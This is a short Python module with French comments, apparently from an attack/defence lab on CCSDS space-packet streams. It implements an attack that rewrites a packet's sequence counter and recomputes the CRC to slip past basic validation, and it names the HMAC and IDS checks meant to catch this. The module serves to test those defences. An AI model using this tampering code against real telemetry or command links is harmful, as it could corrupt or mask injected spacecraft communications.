# =============================================================
# alter_seq_count.py – Attaque 2 / Vecteur 2 : Manipulation du seqCount
#
# Modifie le compteur de séquence d'un paquet CCSDS pour
# perturber la reconstruction ordonnée côté récepteur.
# Le CRC est recalculé pour contourner la validation basique.
# =============================================================

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from src.receiver.frame_parser import parse_stream
from src.attacks._utils import rebuildPacket, offsetInStream


def alterSeqCount(
    rawStream: bytes,
    targetSeq: int,
    newSeq: int,
    verbose: bool = True,
) -> bytes:
    """
    Remplace le seqCount d'un paquet par une nouvelle valeur, CRC recomputed.

    Le seqCount est utilisé par le récepteur pour détecter les pertes
    et réordonner les paquets. Le modifier peut causer des SEQ_GAP ou
    SEQ_REORDER, ou masquer l'injection d'un paquet frauduleux.

    Args:
        rawStream:  Flux de paquets CCSDS bruts.
        targetSeq:  seqCount du paquet à cibler.
        newSeq:     Nouveau numéro de séquence (0–16383).
        verbose:    Afficher un log de l'altération.

    Returns:
        Flux modifié avec seqCount remplacé et CRC recomputed.

    Détection (Défense 2) :
        → HMAC_UNKNOWN : newSeq absent du tag map → alerte
        → SEQ_GAP      : l'IDS détecte le saut de séquence
    """
    packets = parse_stream(rawStream)
    result  = bytearray(rawStream)

    for pkt in packets:
        if pkt["seqCount"] != targetSeq:
            continue

        offset = offsetInStream(packets, targetSeq)
        newPkt = rebuildPacket(
            apid       = pkt["apid"],
            seqFlags   = pkt["seqFlags"],
            seqCount   = newSeq,
            version    = pkt["version"],
            packetType = pkt["packetType"],
            secHdrFlag = pkt["secHdrFlag"],
            payload    = pkt["payload"],
        )
        result[offset : offset + pkt["totalSize"]] = newPkt

        if verbose:
            print(
                f"[A2/alterSeqCount] seqCount {targetSeq} → {newSeq}  "
                f"(CRC recomputed)"
            )
        break

    return bytes(result)
